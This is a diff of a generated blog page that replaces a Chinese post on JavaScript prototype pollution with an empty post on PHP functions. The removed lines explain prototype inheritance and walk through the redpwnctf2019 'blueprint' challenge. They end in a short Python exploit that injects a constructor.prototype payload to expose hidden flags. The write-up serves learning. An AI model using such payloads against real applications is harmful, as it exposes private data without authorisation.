@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>JavaScript原型链污染 | prontosil&#39;s Blog</title>
-  <meta name="keywords" content=" JavaScript ">
-  <meta name="description" content="JavaScript原型链污染 | prontosil&#39;s Blog">
+  <title>php常用函数 | prontosil&#39;s Blog</title>
+  <meta name="keywords" content=" php , 函数 ">
+  <meta name="description" content="php常用函数 | prontosil&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="关于我">
 <meta property="og:type" content="website">
@@ -383,9 +383,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-JavaScript原型链污染" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-php常用函数" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">JavaScript原型链污染</h1>
+        <h1 class="article-title">php常用函数</h1>
     
     <div class="article-meta">
         
@@ -400,19 +400,21 @@
         
         <span class="tag">
             
-            <a class="color1">JavaScript</a>
+            <a class="color4">php</a>
+            
+            <a class="color3">函数</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-30 09:16:49'>2020-01-30 09:13</time>
+        创建时间:<time class="date" title='更新时间: 2020-01-30 23:28:01'>2020-01-30 17:15</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:636</span>
+        <span>字数:0</span>
         
         
         
@@ -420,7 +422,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JavaScript原型链污染"><span class="toc-text">JavaScript原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#如何继承"><span class="toc-text">如何继承</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实例分析"><span class="toc-text">实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redpwnctf2019-blueprint"><span class="toc-text">redpwnctf2019 blueprint</span></a></li></ol></li></ol></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -436,67 +438,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><h2 id="如何继承"><a href="#如何继承" class="headerlink" title="如何继承"></a>如何继承</h2><p>比如，现在有一个”动物”对象的构造函数。</p>
-<pre><code class="javascript">function Animal(){
-
-this.species = &quot;动物&quot;;
-
-}</code></pre>
-<p>还有一个”猫”对象的构造函数。</p>
-<pre><code class="JavaScript">function Cat(name,color){
-
-　　　　this.name = name;
-
-　　　　this.color = color;
-
-　　}</code></pre>
-<p>要让<code>Cat</code>这个类去继承<code>Animal</code>类，如果在其他的语言中，一般就是<code>extented</code>即可</p>
-<p>但是在JavaScript中，</p>
-<pre><code class="javascript">Cat.prototype = new Animal();
-
-Cat.prototype.constructor = Cat;
-
-var cat1 = new Cat(&quot;大毛&quot;,&quot;黄色&quot;);
-
-alert(cat1.species); // 动物</code></pre>
-<p>第一行我们直接修改了<code>Cat</code>的<code>prototype</code>属性，让其指向<code>Animal</code></p>
-<p>这一点不难理解，之后所有<code>Cat</code>实例化的对象cat，它的<code>__proto__</code>就会指向<code>Animal</code>(因为<code>Cat.prototype==cat.__proto__</code>)</p>
-<p>但是第二行比较疑惑，<code>Cat.prototype.constructor</code>又代表了什么？</p>
-<p>其实在<code>Cat.prototype</code>中原先是有一个<code>constructor</code>这个属性的，而<code>Cat.prototype.constructor==Cat</code>这个是成立的</p>
-<p>但是我们直接修改了<code>Cat.prototype</code>之后，此时的<code>Cat.prototyep.constructot != Cat</code></p>
-<p>这就比较荒诞了，所以我们要单独修改将这一个属性修改回来</p>
-<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="redpwnctf2019-blueprint"><a href="#redpwnctf2019-blueprint" class="headerlink" title="redpwnctf2019 blueprint"></a>redpwnctf2019 blueprint</h3><p>题目的简要功能就是能够发表文章，并且选择是否公开，传递的数据是json格式的</p>
-<p>每一个用户有一个<code>user_id</code>，第一次访问的时候会通过<code>makeId</code>函数给一个id</p>
-<p><img src="/2020/01/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1572246225198.png" alt></p>
-<p>调试的时候发现每个用户创建的时候会将一个<code>(userId,user)</code>存入到一个map中，<code>userId</code>就是之前生成的，而这个<code>user</code>对象中就有flag，也就是说每一个用户都有一个flag</p>
-<p>生成的<code>user</code>对象</p>
-<p><img src="/2020/01/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1572246345905.png" alt></p>
-<p>之后会将请求的内容给<code>merge</code>到<code>parsedBody</code>中</p>
-<p>查看<code>defaultsDeep</code>的例子：</p>
-<pre><code>_.defaultsDeep({ &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39; } }, { &#39;user&#39;: { &#39;name&#39;: &#39;fred&#39;, &#39;age&#39;: 36 } });
-// =&gt; { &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39;, &#39;age&#39;: 36 } }</code></pre><p>之后就会将<code>parsedBody</code>中的<code>content</code>和<code>public</code>存放到map中</p>
-<p><img src="/2020/01/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1572246569945.png" alt></p>
-<p>之后的功能也不难想了，如果<code>pubic</code>为true就会展示在首页上，如果不为true就会不会展示</p>
-<p>而我们之前提到每一个用户其实都是有一个flag的，只是这个<code>public</code>属性没有进行设置而已。</p>
-<p>思路就是通过原型链污染使得flag能被展示出来</p>
-<p>渲染页面的主要部分如下：</p>
-<pre><code class="javascript">blueprints: Object.entries(user.blueprints).map(([k, v]) =&gt; ({
-  id: k,
-  content: v.content,
-  public: v.public,
-})),</code></pre>
-<p>exp</p>
-<pre><code class="python">import requests
-
-URL = &quot;http://localhost/&quot;
-user_id = &quot;559eb9b06eb8c581b74f33c1202bff50&quot;
-res = requests.post(URL+&quot;make&quot;,cookies={&quot;user_id&quot;:user_id},json={&quot;content&quot;:&quot;aaaa&quot;, &quot;public&quot;:&quot;true&quot;,&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;public&quot;:&quot;true&quot;}}})
-print(res.text)
-
-
-res2 = requests.get(URL, cookies={&quot;user_id&quot;:user_id})
-print(res2.text)</code></pre>
-
+        
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论 </span>
     </div>
@@ -505,12 +447,12 @@ print(res2.text)</code></pre>
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>JavaScript原型链污染</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">636</span></p>
+    <p><span class="copy-title">文章标题:</span>php常用函数</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">0</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="prontosil">prontosil</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-01-30, 09:13:31</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-30, 09:16:49</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/01/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="JavaScript原型链污染">http://prontosil.com/2020/01/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a>
+    <p><span class="copy-title">发布时间:</span>2020-01-30, 17:15:35</p>
+    <p><span class="copy-title">最后更新:</span>2020-01-30, 23:28:01</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/01/30/php%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/" title="php常用函数">http://prontosil.com/2020/01/30/php%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
